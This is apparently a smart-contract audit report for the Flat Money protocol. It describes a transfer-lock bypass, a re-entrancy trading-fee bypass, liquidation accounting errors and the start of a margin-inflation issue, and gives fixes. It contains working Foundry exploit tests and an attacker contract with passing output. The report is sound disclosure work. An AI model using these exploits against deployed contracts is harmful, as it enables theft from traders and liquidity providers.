# Issue H-1: The transfer lock for leveraged position orders can be bypassed 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/48 

## Found by 
0xVolodya, 0xvj, Bauer, HSP, cawfree, dany.armstrong90, evmboi32, jennifer37, juan, ke1caM, nobody2018, novaman33, r0ck3tz, shaka, takarez
## Summary

The leveraged positions can be closed either through [`DelayedOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L28-L681) or through the [`LimitOrder`](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L27-L214). Once the order is announced via `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` function the `LeverageModule`'s `lock` function is called to prevent given token to be transferred. This mechanism can be bypassed and it is possible to unlock the token transfer while having order announced.

## Vulnerability Detail

Exploitation scenario:
1. Attacker announces leverage close order for his position via `announceLeverageClose` of `DelayedOrder` contract.
2. Attacker announces limit order via `announceLimitOrder` of `LimitOrder` contract.
3. Attacker cancels limit order via `cancelLimitOrder` of `LimitOrder` contract.
4. The position is getting unlocked while the leverage close announcement is active.
5. Attacker sells the leveraged position to a third party.
6. Attacker executes the leverage close via `executeOrder` of `DelayedOrder` contract and gets the underlying collateral stealing the funds from the third party that the leveraged position was sold to.

Following proof of concept presents the attack:
```solidity
function testExploitTransferOut() public {
    uint256 collateralPrice = 1000e8;

    vm.startPrank(alice);

    uint256 balance = WETH.balanceOf(alice);
    console2.log("alice balance", balance);
    
    (uint256 minFillPrice, ) = oracleModProxy.getPrice();

    // Announce order through delayed orders to lock tokenId
    delayedOrderProxy.announceLeverageClose(
        tokenId,
        minFillPrice - 100, // add some slippage
        mockKeeperFee.getKeeperFee()
    );
    
    // Announce limit order to lock tokenId
    limitOrderProxy.announceLimitOrder({
        tokenId: tokenId,
        priceLowerThreshold: 900e18,
        priceUpperThreshold: 1100e18
    });
    
    // Cancel limit order to unlock tokenId
    limitOrderProxy.cancelLimitOrder(tokenId);
    
    balance = WETH.balanceOf(alice);
    console2.log("alice after creating two orders", balance);

    // TokenId is unlocked and can be transferred while the delayed order is active
    leverageModProxy.transferFrom(alice, address(0x1), tokenId);
    console2.log("new owner of position NFT", leverageModProxy.ownerOf(tokenId));

    balance = WETH.balanceOf(alice);
    console2.log("alice after transfering position NFT out e.g. selling", balance);

    skip(uint256(vaultProxy.minExecutabilityAge())); // must reach minimum executability time

    uint256 oraclePrice = collateralPrice;

    bytes[] memory priceUpdateData = getPriceUpdateData(oraclePrice);
    delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData);

    uint256 finalBalance = WETH.balanceOf(alice);
    console2.log("alice after executing delayerd order and cashing out profit", finalBalance);
    console2.log("profit", finalBalance - balance);
}
```

Output
```shell
Running 1 test for test/unit/Common/LimitOrder.t.sol:LimitOrderTest
[PASS] testExploitTransferOut() (gas: 743262)
Logs:
  alice balance 99879997000000000000000
  alice after creating two orders 99879997000000000000000
  new owner of position NFT 0x0000000000000000000000000000000000000001
  alice after transfering position NFT out e.g. selling 99879997000000000000000
  alice after executing delayerd order and cashing out profit 99889997000000000000000
  profit 10000000000000000000

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 50.06ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

The attacker can sell the leveraged position with a close order opened, execute the order afterward, and steal the underlying collateral.

## Code Snippet
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L298
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L76
- https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LimitOrder.sol#L94

## Tool used

Manual Review

## Recommendation

It is recommended to prevent announcing order either through `DelayedOrder.announceLeverageClose` or `LimitOrder.announceLimitOrder` if the leveraged position is already locked.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid: i believe features that are meant for the future is out-of scope and thus selling feature falls into that; user can only transfer the nft now; nothing sort of selling; so no collateral fraud here.



# Issue H-2: A malicious user can bypass limit order trading fees via cross-function re-entrancy 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/75 

## Found by 
LTDingZhen, juan, nobody2018, r0ck3tz
## Summary
A malicious user can bypass limit order trading fees via cross-function re-entrancy, since `_safeMint` makes an external call to the user before updating state.

## Vulnerability Detail
In the `LeverageModule` contract, the `_mint` function calls `_safeMint`, which makes an external call to the receiver of the NFT (the `to` address).

<details>
<summary>LeverageModule::_mint()</summary>

```javascript
function _mint(address _to) internal returns (uint256 _tokenId) {
        _tokenId = tokenIdNext;

        _safeMint(_to, tokenIdNext);

        tokenIdNext += 1;
}
```
</details>

Only after this external call, `vault.setPosition()` is called to create the new position in the vault's storage mapping. This means that an attacker can gain control of the execution while the state of  `_positions[_tokenId]` in FlatcoinVault is not up-to-date.

<details>

<summary>LeverageModule::executeOpen()</summary>

```javascript
_newTokenId = _mint(_account); // Here, an attack gains control of execution

vault.setPosition( // This updates _positions[_tokenId] in the FlatcoinVault, but after the external call
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
    _newTokenId
);
```

> Permalink: https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

</details>

This outdated state of `_positions[_tokenId]` can be exploited by an attacker once the external call has been made. They can re-enter `LimitOrder::announceLimitOrder()` and provide the tokenId that has just been minted.
In that function, the trading fee is calculated as follows:

```javascript
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);
```
However since the position has not been created yet (due to state being updated after an external call), this results in the `tradeFee` being 0 since `vault.getPosition(tokenId).additionalSize` returns the default value of a uint256 (0), and `tradeFee` = fee * size.

Hence, when the limit order is executed, the trading fee (`tradeFee`) charged to the user will be `0`.

## Impact
A malicious user can bypass the trading fees for a limit order, via cross-function re-entrancy. These trading fees were supposed to be paid to the LPs by increasing `stableCollateralTotal`, but due to limit orders being able to bypass trading fees (albeit during the same transaction as opening the position), LPs are now less incentivised to provide their liquidity to the protocol.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LeverageModule.sol#L111-L121

## Proof of Concept
Summary:
1. A user announces opening a leverage position, calling announceLeverageOpen() via a smart contract which implements `IERC721Receiver`.
2. Once the keeper executes the order, the contract is called, with the function `onERC721Received(address,address,uint256,bytes)`
3. The function calls `LimitOrder::announceLimitOrder()` to create the desired limit order to close the position. (stop loss, take profit levels)
4. The contract then returns `msg.sig` (the function signature of the executing function) to satify the `IERC721Receiver`'s requirement.

To run this proof of concept:
1. Add 2 files `AttackerContract.sol` and `ReentrancyPoC.t.sol` to `flatcoin-v1/test/unit` in the project's repo.
2. run `forge test --mt test_tradingFeeBypass -vv` in the terminal

<details><summary>Attacker Contract</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {Setup} from "../helpers/Setup.sol";
import {LimitOrder} from "src/LimitOrder.sol";

contract AttackerContract {

    LimitOrder limitOrderProxy;

    function setLimitOrderProxy(address limitOrderAddress) external {
        limitOrderProxy = LimitOrder(limitOrderAddress);
    }
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns(bytes4) {
        // Do the cross-function re-entrancy
        limitOrderProxy.announceLimitOrder(tokenId, 750e18, 1250e18);

        // Return the function signature (required by the standard)
        return msg.sig;
        // Note: Also could return `this.onERC721Received.selector` or `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`
    }
}
```
</details>

<details>
<summary>Proof of Concept (Foundry Test)</summary>

```javascript
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.18;

import {OrderHelpers} from "../helpers/OrderHelpers.sol";
import {FlatcoinStructs} from "../../src/libraries/FlatcoinStructs.sol";
import "forge-std/console2.sol";
import {AttackerContract} from "./AttackerContract.sol";
import {Setup} from "../helpers/Setup.sol";

contract ReentrancyPoC is Setup, OrderHelpers {
    function test_tradingFeeBypass() public {
        
        // Set up and initialize the attacker's contract
        AttackerContract attackerContract = new AttackerContract();
        attackerContract.setLimitOrderProxy(address(limitOrderProxy));

        // Deal the exploiter contract with WETH + ETH
        deal(address(WETH), address(attackerContract), 100_000e18); // Loading account with `token`.
        deal(address(attackerContract), 100_000e18); // Loading account with native token.

        uint256 aliceBalanceBefore = WETH.balanceOf(alice);
        uint256 stableDeposit = 100e18;
        uint256 collateralPrice = 1000e8;

        // Alice provides liquidity
        vm.startPrank(alice);
        announceAndExecuteDeposit({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: stableDeposit,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });
        vm.stopPrank();

        // Contract opens position: 10 ETH collateral, 30 ETH additional size (4x leverage)
        uint256 tokenId = announceAndExecuteLeverageOpen({
            traderAccount: address(attackerContract),
            keeperAccount: keeper,
            margin: 10e18,
            additionalSize: 30e18,
            oraclePrice: collateralPrice,
            keeperFeeAmount: 0
        });

        // Get the limit order that has been created by the attacker's contract
        FlatcoinStructs.Order memory limitOrderCreated = limitOrderProxy.getLimitOrder(tokenId);

        // Get the order's data
        FlatcoinStructs.LimitClose memory orderData = abi.decode(limitOrderCreated.orderData, (FlatcoinStructs.LimitClose));
        
        ///////////////////////
        // POC Assertions    //
        ///////////////////////
        // Assert that the tradeFee for the limit order is 0
        assertEq(orderData.tradeFee, 0);

        // Assert that the price threshold is 750e18, showing that it is not zero, showing that the orderData is not just returning the default values.
        assertEq(orderData.priceLowerThreshold, 750e18);


        ///////////////////////
        // Other Assertions  //
        ///////////////////////
        // The following assertions are copied from another test in the test suite-

        // ERC721 token assertions:
        {
            (uint256 buyPrice, ) = oracleModProxy.getPrice();
            // Position 0:
            FlatcoinStructs.Position memory position0 = vaultProxy.getPosition(tokenId);
            assertEq(position0.lastPrice, buyPrice, "Entry price is not correct");
            assertEq(position0.marginDeposited, 10e18, "Margin deposited is not correct");
            assertEq(position0.additionalSize, 30e18, "Size is not correct");
            assertEq(tokenId, 0, "Token ID is not correct");
        }
        // PnL assertions:
        {
            FlatcoinStructs.PositionSummary memory positionSummary0 = leverageModProxy.getPositionSummary(tokenId);
            uint256 collateralPerShareBefore = stableModProxy.stableCollateralPerShare();

            // Check that before the WETH price change, there is no profit or loss change
            assertEq(positionSummary0.profitLoss, 0, "Pnl for user 0 is not correct");
            assertEq(
                positionSummary0.marginAfterSettlement,
                10e18,
                "Margin after settlement for user 0 is not correct"
            ); // full margin available
        }
    }  
}
```

</details>

<details>
<summary> Console Output </summary>

```powershell
Running 1 test for test/unit/ReentrancyPoC.t.sol:ReentrancyPoC
[PASS] test_tradingFeeBypass() (gas: 2006498)
Logs:
  tradeFee: 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.81ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

</details>

## Tool used
Manual Review

## Recommendation
To fix this specific issue, the following change is sufficient:
```diff
-_newTokenId = _mint(_account); 

vault.setPosition( 
    FlatcoinStructs.Position({
        lastPrice: entryPrice,
        marginDeposited: announcedOpen.margin,
        additionalSize: announcedOpen.additionalSize,
        entryCumulativeFunding: vault.cumulativeFundingRate()
    }),
-   _newTokenId
+   tokenIdNext
);
+_newTokenId = _mint(_account); 
``` 
However there are still more state changes that would occur after the `_mint` function (potentially yielding other cross-function re-entrancy if the other contracts were changed) so the optimum solution would be to mint the NFT after all state changes have been executed, so the safest solution would be to move `_mint` all the way to the end of `LeverageModule::executeOpen()`.

Otherwise, if changing this order of operations is undesirable for whatever reason, one can implement the following check within `LimitOrder::announceLimitOrder()` to ensure that the `positions[_tokenId]` is not uninitialized:

```diff
uint256 tradeFee = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).getTradeFee(
    vault.getPosition(tokenId).additionalSize
);

+require(additionalSize > 0, "Additional Size of a position cannot be zero");

```



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: medium finding as there is no profit in doing so; user closed position immediately after opening it; medium(5)



# Issue H-3: Incorrect handling of PnL during liquidation 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/180 

## Found by 
santipu\_, xiaoming90
## Summary

The incorrect handling of PnL during liquidation led to an error in the protocol's accounting mechanism, which might result in various issues, such as the loss of assets and the stable collateral total being inflated.

## Vulnerability Detail

#### First Example

Assume a long position with the following state:

- Margin Deposited = +20
- Accrued Funding = -100
- Profit & Loss (PnL) = +100
- Liquidation Margin = 30
- Liquidation Fee = 25
- Settled Margin = Margin Deposited + Accrued Funding + PnL = 20

Let the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.

Firstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 100, while the LP's `stableCollateralTotal` will increase by 100.

```solidity
settleFundingFees() = Short/LP need to pay Long 100

marginDepositedTotal = marginDepositedTotal + funding fee
marginDepositedTotal = y + (-100) = (y - 100)

stableCollateralTotal = x + (-(-100)) = (x + 100)
```

Since the position's settle margin is below the liquidation margin, the position will be liquidated.

At Line 109, the condition `(settledMargin > 0)` will be evaluated as `True`. At Line 123:

```solidity
if (uint256(settledMargin) > expectedLiquidationFee)
if (+20 > +25) => False
liquidatorFee = settledMargin
liquidatorFee = +20
```

The `liquidationFee` will be to +20 at Line 127 below. This basically means that all the remaining margin of 20 will be given to the liquidator, and there should be no remaining margin for the LPs.

At Line 133 below, the `vault.updateStableCollateralTotal` function will be executed:

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(0 - (+100));
vault.updateStableCollateralTotal(-100);

stableCollateralTotal = (x + 100) - 100 = x
```

When `vault.updateStableCollateralTotal` is set to `-100`, `stableCollateralTotal` is equal to $x$.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

```solidity
File: LiquidationModule.sol
085:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
102:         // Check that the total margin deposited by the long traders is not -ve.
103:         // To get this amount, we will have to account for the PnL and funding fees accrued.
104:         int256 settledMargin = positionSummary.marginAfterSettlement;
105: 
106:         uint256 liquidatorFee;
107: 
108:         // If the settled margin is greater than 0, send a portion (or all) of the margin to the liquidator and LPs.
109:         if (settledMargin > 0) {
110:             // Calculate the liquidation fees to be sent to the caller.
111:             uint256 expectedLiquidationFee = PerpMath._liquidationFee(
112:                 position.additionalSize,
113:                 liquidationFeeRatio,
114:                 liquidationFeeLowerBound,
115:                 liquidationFeeUpperBound,
116:                 currentPrice
117:             );
118: 
119:             uint256 remainingMargin;
120: 
121:             // Calculate the remaining margin after accounting for liquidation fees.
122:             // If the settled margin is less than the liquidation fee, then the liquidator fee is the settled margin.
123:             if (uint256(settledMargin) > expectedLiquidationFee) {
124:                 liquidatorFee = expectedLiquidationFee;
125:                 remainingMargin = uint256(settledMargin) - expectedLiquidationFee;
126:             } else {
127:                 liquidatorFee = uint256(settledMargin);
128:             }
129: 
130:             // Adjust the stable collateral total to account for user's remaining margin.
131:             // If the remaining margin is greater than 0, this goes to the LPs.
132:             // Note that {`remainingMargin` - `profitLoss`} is the same as {`marginDeposited` + `accruedFunding`}.
133:             vault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);
134: 
135:             // Send the liquidator fee to the caller of the function.
136:             // If the liquidation fee is greater than the remaining margin, then send the remaining margin.
137:             vault.sendCollateral(msg.sender, liquidatorFee);
138:         } else {
139:             // If the settled margin is -ve then the LPs have to bear the cost.
140:             // Adjust the stable collateral total to account for user's profit/loss and the negative margin.
141:             // Note: We are adding `settledMargin` and `profitLoss` instead of subtracting because of their sign (which will be -ve).
142:             vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
143:         }
```

Next, the `vault.updateGlobalPositionData` function [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159) will be executed.

```solidity
vault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})
vault.updateGlobalPositionData({marginDelta: -(20 + (-100))})
vault.updateGlobalPositionData({marginDelta: 80})

profitLossTotal = 100
newMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = (y - 100) + 80 + 100 = (y + 80)

stableCollateralTotal = stableCollateralTotal + -PnL
stableCollateralTotal = x + (-100) = (x - 100)
```

The final `newMarginDepositedTotal` is $y + 80$ and `stableCollateralTotal` is $x -100$, which is incorrect. In this scenario

- There is no remaining margin for the LPs, as all the remaining margin has been sent to the liquidator as a fee. The remaining margin (settled margin) is also not negative. Thus, there should not be any loss on the `stableCollateralTotal`. The correct final `stableCollateralTotal` should be $x$.
- The final `newMarginDepositedTotal` is $y + 80$, which is incorrect as this indicates that the long trader's pool has gained 80 ETH, which should not be the case when a long position is being liquidated.

#### Second Example

The current price of rETH is \$1000.

Let's say there is a user A (Alice) who makes a deposit of 5 rETH as collateral for LP.

Let's say another user, Bob (B), comes up, deposits 2 rETH as a margin, and creates a position with a size of 5 rETH, basically creating a perfectly hedged market. Since this is a perfectly hedged market, the accrued funding fee will be zero for the context of this example.

Total collateral in the system = 5 rETH + 2 rETH = 7 rETH

After some time, the price of rETH drop to \$500. As a result, Bob's position is liquidated as its settled margin is less than zero.

$$
settleMargin = 2\  rETH + \frac{5 \times (500 - 1000)}{500}
= 2\ rETH - 5\ rETH = -3\ rETH
$$

During the liquidation, the following code is executed to update the LP's stable collateral total:

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(-3 rETH - (-5 rETH));
vault.updateStableCollateralTotal(+2);
```

LP's stable collateral total increased by 2 rETH.

Subsequently, the `updateGlobalPositionData` function will be executed.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159

```solidity
File: LiquidationModule.sol
85:     function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId) {
..SNIP..
159:         vault.updateGlobalPositionData({
160:             price: position.lastPrice,
161:             marginDelta: -(int256(position.marginDeposited) + positionSummary.accruedFunding),
162:             additionalSizeDelta: -int256(position.additionalSize) // Since position is being closed, additionalSizeDelta should be negative.
163:         });
```

Within the `updateGlobalPositionData` function, the `profitLossTotal` at Line 179 will be -5 rETH. This means that the long trader (Bob) has lost 5 rETH.

At Line 205 below, the PnL of the long traders (-5 rETH) will be transferred to the LP's stable collateral total. In this case, the LPs gain 5 rETH.

Note that the LP's stable collateral total has been increased by 2 rETH earlier and now we are increasing it by 5 rETH again. Thus, the total gain by LPs is 7 rETH. If we add 7 rETH to the original stable collateral total, it will be 7 rETH + 5 rETH = 12 rETH. However, this is incorrect because we only have 7 rETH collateral within the system, as shown at the start.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L173

```solidity
File: FlatcoinVault.sol
173:     function updateGlobalPositionData(
174:         uint256 _price,
175:         int256 _marginDelta,
176:         int256 _additionalSizeDelta
177:     ) external onlyAuthorizedModule {
178:         // Get the total profit loss and update the margin deposited total.
179:         int256 profitLossTotal = PerpMath._profitLossTotal({globalPosition: _globalPositions, price: _price});
180: 
181:         // Note that technically, even the funding fees should be accounted for when computing the margin deposited total.
182:         // However, since the funding fees are settled at the same time as the global position data is updated,
183:         // we can ignore the funding fees here.
184:         int256 newMarginDepositedTotal = int256(_globalPositions.marginDepositedTotal) + _marginDelta + profitLossTotal;
185: 
186:         // Check that the sum of margin of all the leverage traders is not negative.
187:         // Rounding errors shouldn't result in a negative margin deposited total given that
188:         // we are rounding down the profit loss of the position.
189:         // If anything, after closing the last position in the system, the `marginDepositedTotal` should can be positive.
190:         // The margin may be negative if liquidations are not happening in a timely manner.
191:         if (newMarginDepositedTotal < 0) {
192:             revert FlatcoinErrors.InsufficientGlobalMargin();
193:         }
194: 
195:         _globalPositions = FlatcoinStructs.GlobalPositions({
196:             marginDepositedTotal: uint256(newMarginDepositedTotal),
197:             sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
198:             lastPrice: _price
199:         });
200: 
201:         // Profit loss of leverage traders has to be accounted for by adjusting the stable collateral total.
202:         // Note that technically, even the funding fees should be accounted for when computing the stable collateral total.
203:         // However, since the funding fees are settled at the same time as the global position data is updated,
204:         // we can ignore the funding fees here
205:         _updateStableCollateralTotal(-profitLossTotal);
206:     }
```

#### Third Example

At $T0$, the marginDepositedTotal = 70 ETH, stableCollateralTotal = 100 ETH, vault's balance = 170 ETH

| Bob's Long Position                                          | Alice (LP)          |
| ------------------------------------------------------------ | ------------------- |
| Margin = 70 ETH<br />Position Size = 500 ETH<br />Leverage = (500 + 20) / 20 = 26x<br />Liquidation Fee = 50 ETH<br />Liquidation Margin = 60 ETH<br />Entry Price = \$1000 per ETH | Deposited = 100 ETH |

At $T1$​, the position's settled margin falls to 60 ETH (margin = +70, accrued fee = -5, PnL = -5) and is subjected to liquidation.

Firstly, the `settleFundingFees()` function will be executed at the start of the liquidation process. The effect of the `settleFundingFees()` function is shown below. The long trader's `marginDepositedTotal` will be reduced by 5, while the LP's `stableCollateralTotal` will increase by 5.

```solidity
settleFundingFees() = Long need to pay short 5

marginDepositedTotal = marginDepositedTotal + funding fee
marginDepositedTotal = 70 + (-5) = 65

stableCollateralTotal = 100 + (-(-5)) = 105
```

Next, [this part](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L109) of the code will be executed to send a portion of the liquidated position's margin to the liquidator and LPs.

```solidity
settledMargin > 0 => True
(settledMargin > expectedLiquidationFee) => (+60 > +50) => True
remainingMargin = uint256(settledMargin) - expectedLiquidationFee = 60 - 50 = 10
```

50 ETH will be sent to the liquidator and the remaining 10 ETH should goes to the LPs.

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>
stableCollateralTotal = 105 ETH + (remaining margin - PnL)
stableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))
stableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH
```

Next, the `vault.updateGlobalPositionData` function [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L159) will be executed.

```solidity
vault.updateGlobalPositionData({marginDelta: -(position.marginDeposited + positionSummary.accruedFunding)})
vault.updateGlobalPositionData({marginDelta: -(70 + (-5))})
vault.updateGlobalPositionData({marginDelta: -65})

profitLossTotal = -5
newMarginDepositedTotal = globalPositions.marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = 70 + (-65) + (-5) = 0

stableCollateralTotal = stableCollateralTotal + -PnL
stableCollateralTotal = 120 + (-(5)) = 125
```

The reason why the profitLossTotal = -5 is because there is only one (1) position in the system. So, this loss actually comes from the loss of Bob's position.

The `newMarginDepositedTotal = 0` is correct. This is because the system only has 1 position, which is Bob's position; once the position is liquidated, there should be no margin deposited left in the system.

However, `stableCollateralTotal = 125` is incorrect. Because the vault's collateral balance now is 170 - 50 (send to liquidator) = 120. Thus, the tracked balance and actual collateral balance are not in sync.

## Impact

The following is a list of potential impacts of this issue:

- First Example: LPs incur unnecessary losses during liquidation, which would be avoidable if the calculations were correctly implemented from the start.
- Second Example: An error in the protocol's accounting mechanism led to an inflated increase in the LPs' stable collateral total, which in turn inflated the number of tokens users can withdraw from the system.
- Third Example: The accounting error led to the tracked balance and actual collateral balance not being in sync.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/LiquidationModule.sol#L85

## Tool used

Manual Review

## Recommendation

To remediate the issue, the `profitLossTotal` should be excluded within the `updateGlobalPositionData` function during liquidation. 

```diff
- profitLossTotal = PerpMath._profitLossTotal(...)

- newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta + profitLossTotal
+ newMarginDepositedTotal = globalPositions.marginDepositedTotal + _marginDelta

if (newMarginDepositedTotal < 0) {
    revert FlatcoinErrors.InsufficientGlobalMargin();
}

_globalPositions = FlatcoinStructs.GlobalPositions({
    marginDepositedTotal: uint256(newMarginDepositedTotal),
    sizeOpenedTotal: (int256(_globalPositions.sizeOpenedTotal) + _additionalSizeDelta).toUint256(),
    lastPrice: _price
});
        
- _updateStableCollateralTotal(-profitLossTotal);
```

The existing `updateGlobalPositionData` function still needs to be used for other functions besides liquidation. As such, consider creating a separate new function (e.g., updateGlobalPositionDataDuringLiquidation) solely for use during the liquidation that includes the above fixes.

The following attempts to apply the above fix to the three (3) examples described in the report to verify that it is working as intended.

#### First Example

Let the current `StableCollateralTotal` be $x$ and `marginDepositedTotal` be $y$ at the start of the liquidation.

- **During funding settlement:** 

StableCollateralTotal = $x$​​ + 100

marginDepositedTotal = $y$ - 100

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(int256(remainingMargin) - positionSummary.profitLoss);
vault.updateStableCollateralTotal(0 - (+100));
vault.updateStableCollateralTotal(-100);
```

StableCollateralTotal = ($x$ + 100) - 100 = $x$

- **During Global Position Update:** 

marginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(20 + (-100)) = 80

newMarginDepositedTotal = marginDepositedTotal + marginDelta = ($y$ - 100) + 80 = ($y$ - 20)

No change to StableCollateralTotal here. Remain at $x$

- **Conclusion:** 

1) The LPs should not gain or lose in this scenario. Thus, the fact that the StableCollateralTotal remains as $x$ before and after the liquidation is correct.
2) The `marginDepositedTotal` is ($y$ - 20) is correct because the liquidated position's remaining margin is 20 ETH. Thus, when this position is liquidated, 20 ETH should be deducted from the `marginDepositedTotal`
3) No revert during the execution.

#### Second Example

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(settledMargin - positionSummary.profitLoss);
vault.updateStableCollateralTotal(-3 rETH - (-5 rETH));
vault.updateStableCollateralTotal(+2);
```

StableCollateralTotal = 5 + 2 = 7 ETH

- **During Global Position Update:**

marginDelta = -(position.marginDeposited + positionSummary.accruedFunding) = -(2 + 0) = -2

marginDepositedTotal = marginDepositedTotal + marginDelta = 2 + (-2) = 0

- **Conclusion:**

StableCollateralTotal = 7 ETH, marginDepositedTotal = 0 (Total 7 ETH tracked in the system)

Balance of collateral in the system = 7 ETH. Thus, both values are in sync. No revert.

#### Third Example

- **During funding settlement (Transfer 5 from Long to LP):** 

marginDepositedTotal = 70 + (-5) = 65

StableCollateralTotal = 100 + 5 = 105

- **Transfer fee to Liquidator**

50 ETH sent to the liquidator from the system: Balance of collateral in the system = 170 ETH - 50 ETH = 120 ETH

- **During updateStableCollateralTotal:**

```solidity
vault.updateStableCollateralTotal(remainingMargin - positionSummary.profitLoss) =>
stableCollateralTotal = 105 ETH + (remaining margin - PnL)
stableCollateralTotal = 105 ETH + (10 ETH - (-5 ETH))
stableCollateralTotal = 105 ETH + (15 ETH) = 120 ETH
```

StableCollateralTotal = 120 ETH

- **During Global Position Update:** 

marginDelta= -(position.marginDeposited + positionSummary.accruedFunding) = -(70 + (-5)) = -65

marginDepositedTotal = 65 + (-65) = 0

- **Conclusion:**

StableCollateralTotal = 120 ETH, marginDepositedTotal = 0 (Total 120 ETH tracked in the system)

Balance of collateral in the system = 120 ETH. Thus, both values are in sync. No revert.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: whole lot of lessons taught here; high(3)



**rashtrakoff**

Wow, this is a detailed explanation. We did find this issue during the audit and glad that you have found it as well!

# Issue H-4: `marginDepositedTotal` can be significantly inflated 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/181 

## Found by 
CL001, Dliteofficial, KingNFT, chaduke, evmboi32, juan, ni8mare, vvv, xiaoming90
## Summary

The `marginDepositedTotal` can be significantly inflated due to an underflow that occurs when casting int256 to uint256, leading to core functionalities and accounting of the protocol being broken and assets being stuck.

## Vulnerability Detail

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L233

```solidity
File: FlatcoinVault.sol
216:     function settleFundingFees() public returns (int256 _fundingFees) {
..SNIP..
226:         // Calculate the funding fees accrued to the longs.
227:         // This will be used to adjust the global margin and collateral amounts.
228:         _fundingFees = PerpMath._accruedFundingTotalByLongs(_globalPositions, unrecordedFunding);
229: 
230:         // In the worst case scenario that the last position which remained open is underwater,
231:         // we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
232:         _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
233:             ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
234:             : 0;
235: 
236:         _updateStableCollateralTotal(-_fundingFees);
```

The `_globalPositions.marginDepositedTotal` is uint256. Thus, the value assigned to this state variable must always be a non-negative value. The logic in Lines 232-234 intends to ensure that the system can never have a negative margin deposited total.

